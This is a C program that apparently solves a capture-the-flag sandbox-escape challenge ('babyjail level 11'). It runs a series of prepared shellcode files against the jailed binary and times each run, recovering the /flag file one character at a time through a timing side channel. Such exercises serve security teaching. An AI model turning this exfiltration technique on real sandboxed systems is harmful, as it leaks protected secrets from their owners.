#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>

int main(void)
{
    FILE * fp = fopen("flag", "a");

    for (int i = 0; i < 100; i++)
    {
        time_t t1, t2;
        double diff;
        char compile[200];
        sprintf(compile, "/babyjail_level11_teaching1 /flag < ./shellcode/shellcode_%d_raw", i);

        time(&t1);
        system(compile);
        time(&t2);

        diff = difftime(t2, t1);
        int result = (int) round(diff);
        result += 33;
        fputc(result, fp);
        printf("The result is %c\n", result);
    }
    
    fclose(fp);
    return 0;
}